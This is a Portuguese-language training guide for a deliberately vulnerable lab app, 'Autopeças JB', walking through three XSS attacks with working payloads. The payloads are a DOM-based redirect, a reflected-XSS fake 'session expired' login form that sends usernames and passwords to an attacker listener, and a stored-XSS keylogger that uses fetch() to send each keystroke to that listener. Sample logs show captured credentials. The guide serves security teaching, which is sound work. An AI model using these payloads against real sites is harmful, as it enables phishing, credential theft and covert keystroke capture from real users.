# Guia de Exploração Avançada: Cenários e Ataques de Alto Impacto via XSS

Este documento complementa o laboratório de testes do **Autopeças JB** apresentando cenários de exploração de alto impacto (além do tradicional `alert()`). O objetivo é exemplificar de forma técnica e conceitual como atacantes utilizam vulnerabilidades de **Cross-Site Scripting (XSS)** para comprometer o navegador do usuário, realizar manipulações visuais e capturar interações silenciosamente.

---

## 🆚 Visão Geral Comparativa do Impacto dos Ataques

No cenário profissional, a execução de caixas de diálogo como `alert()`, `confirm()` ou `prompt()` serve exclusivamente como uma **Prova de Conceito (PoC)** rápida para validar que um *sink* é vulnerável. Ataques de impacto real afetam o triângulo de segurança (Confidencialidade, Integridade e Disponibilidade) e são estruturados conforme a categoria da falha:

* **Open Redirect (Redirecionamento Aberto via DOM-Based XSS):**
  * **Objetivo do Ataque:** Forçar a navegação da vítima para domínios maliciosos externos.
  * **Alvo Focado:** Sessão local e navegação ativa do usuário.
  * **Nível de Persistência:** Nulo (dura apenas durante a execução da aba do navegador).
* **Interface Spoofing / Phishing Interno (via Reflected XSS):**
  * **Objetivo do Ataque:** Exibir formulários de autenticação ou de pagamento falsos sob a autoridade de um domínio legítimo.
  * **Alvo Focado:** Credenciais de acesso (usuário e senha) ou dados de cartão de crédito.
  * **Nível de Persistência:** Nulo (disparado sob demanda de clique em link malicioso de engenharia social).
* **Keylogger Conceitual Silencioso (via Stored XSS):**
  * **Objetivo do Ataque:** Capturar cada tecla digitada pelo usuário na tela legítima da aplicação sem interferir na usabilidade.
  * **Alvo Focado:** Informações pessoais e credenciais digitadas em qualquer formulário.
  * **Nível de Persistência:** Alto (persiste no banco de dados do servidor, afetando qualquer usuário que carregar o chamado).

---

## 1. DOM-Based XSS: Open Redirect (Redirecionamento Aberto Silencioso)

### O Conceito
Este ataque explora o controle de fluxo de navegação do browser no lado do cliente. Quando o código JavaScript manipula de forma insegura objetos de redirecionamento de tela (como `window.location`), o atacante pode desviar o tráfego do usuário legítimo para servidores controlados por cibercriminosos (páginas que distribuem malwares ou cobram pagamentos falsos).

### Como demonstrar no laboratório:
1. Ative o **Modo Vulnerável** no painel de segurança.
2. No **Computador 2 (Atacante)**, monte um link que utilize o *source* `#mensagem` para direcionar a tela para um site externo (usaremos `example.com` para simulação segura):
   ```text
   http://[IP_COMPUTADOR_1]:5500/#mensagem=<img src=x onerror="window.location.href='https://example.com';">
   ```
3. Envie ou clique no link.
4. **Comportamento Observado:** A página do Autopeças JB é carregada temporariamente. Assim que o interpretador processa o fragmento de hash no cliente, a aba do navegador é redirecionada de forma instantânea e silenciosa para o domínio externo `example.com`.

### Diferença Crítica e Perigo:
Diferente de um simples redirecionamento comum de URL que pode ser inspecionado no histórico HTTP, o redirecionamento via DOM-Based XSS não envolve o envio de requisições de controle ao servidor Django. O redirecionamento ocorre puramente na engine JavaScript do browser, contornando regras comuns de segurança de proxy ou filtros de gateway que monitoram cabeçalhos de resposta HTTP (como o cabeçalho `Location`).

---

## 2. Reflected XSS: Interface Spoofing (Phishing Interno / Defacement Dinâmico)

### O Conceito
O atacante manipula o corpo do documento ativo (`document.body.innerHTML`) utilizando código JavaScript para reescrever toda a estrutura visível do site confiável. O HTML original do catálogo é substituído por uma tela idêntica à de autenticação da aplicação ou de um portal de pagamento.

### Como demonstrar no laboratório:
1. Certifique-se de que a aplicação está no **Modo Vulnerável**.
2. No **Computador 2 (Atacante)**, monte a URL injetando uma estrutura HTML simplificada contendo um formulário de login falso que direciona os dados para o listener na porta 8001:
   ```text
   http://[IP_COMPUTADOR_1]:5500/index.html?q=<img src=x onerror="document.body.innerHTML = '<h2>Sessão Expirada</h2><p>Por favor, faça login novamente:</p><form action=http://[IP_COMPUTADOR_2]:8001/login_exfil method=GET><input name=user placeholder=Usuário><br><input type=password name=pass placeholder=Senha><br><button type=submit>Entrar</button></form>';">
   ```
   > [!NOTE]
   > **Nota de Configuração do Listener (Python http.server):** 
   > O servidor padrão do Python (`python -m http.server`) não suporta requisições de método `POST` por padrão, respondendo com o erro `501 Unsupported method ('POST')`. Por isso, configuramos o formulário do ataque com `method=GET`. Dessa forma, o browser anexa os dados digitados na URL como parâmetros, permitindo que o console do terminal registre as credenciais na linha de log.
3. Pressione **Enter**.
4. **Comportamento Observado:** A interface normal da loja desaparece imediatamente, sendo substituída pelo formulário de "Sessão Expirada". Preencha o usuário e senha e submeta.
5. **Resultado no Terminal:** O log de requisições do terminal que está executando o comando `python -m http.server 8001` exibirá instantaneamente a requisição GET com os dados inseridos expostos na URL:
   ```text
   ::ffff:192.168.x.x - - [26/Jun/2026 02:00:19] "GET /login_exfil?user=admin&pass=minhasenha123 HTTP/1.1" 404 -
   ```

### Diferença Crítica e Perigo:
Esta técnica de engenharia social é considerada altamente eficaz porque **não há alteração na barra de endereços do navegador**. O domínio continua sendo o endereço legítimo da aplicação (`http://[IP_COMPUTADOR_1]`), o certificado SSL (se implementado) continua constando como válido e confiável, mas o conteúdo renderizado é totalmente controlado pelo atacante.

---

## 3. Stored XSS: Keylogger Conceitual Silencioso (Monitoramento de Digitação)

### O Conceito
Este ataque monitora os eventos de digitação do teclado da vítima de maneira invisível. O script malicioso se instala como um ouvinte global de eventos (`event listener`) no documento ativo. Sempre que o usuário digita qualquer caractere (como dados cadastrais, mensagens no chat ou formulários), o caractere é enviado imediatamente para o servidor do atacante.

### Como demonstrar no laboratório:
1. No navegador do **Computador 1 (Vítima/Admin)**, acesse o painel restrito e deixe-o no **Modo Vulnerável**.
2. No navegador do **Computador 2 (Atacante)**, acesse `suporte.html` e insira o seguinte *payload* no campo de mensagem de chamado:
   ```html
   Urgente! <img src=x onerror="document.addEventListener('keypress', function(e) { fetch('http://[IP_COMPUTADOR_2]:8001/keylog?char=' + String.fromCharCode(e.which)); });">
   ```
3. Envie o formulário para salvar o registro no banco de dados.
4. No **Computador 1 (Vítima/Admin)**, clique em **"Atualizar Chamados"** para carregar o payload.
5. Agora, com a aba do painel aberta no Computador 1, clique em qualquer área da página e comece a digitar letras no teclado do Computador 1 (exemplo: digite `admin123`).
6. **Comportamento Observado:** No terminal do **Computador 2 (Atacante)**, cada tecla pressionada aparecerá registrada de forma individual no log de requisições do servidor HTTP:
   ```text
   192.168.x.x - - [26/Jun/2026 01:25:01] "GET /keylog?char=a HTTP/1.1" 404 -
   192.168.x.x - - [26/Jun/2026 01:25:02] "GET /keylog?char=d HTTP/1.1" 404 -
   192.168.x.x - - [26/Jun/2026 01:25:03] "GET /keylog?char=m HTTP/1.1" 404 -
   ...
   ```

### Diferença Crítica e Perigo:
Esta falha atinge de forma direta a integridade e a confidencialidade a longo prazo. Enquanto um roubo de sessão (JWT) é limitado pelo tempo de expiração do token de autenticação, o Keylogger ativo permite que o atacante espione a vítima continuamente durante o tempo em que ela permanecer na página vulnerável, coletando credenciais no momento exato em que são digitadas.
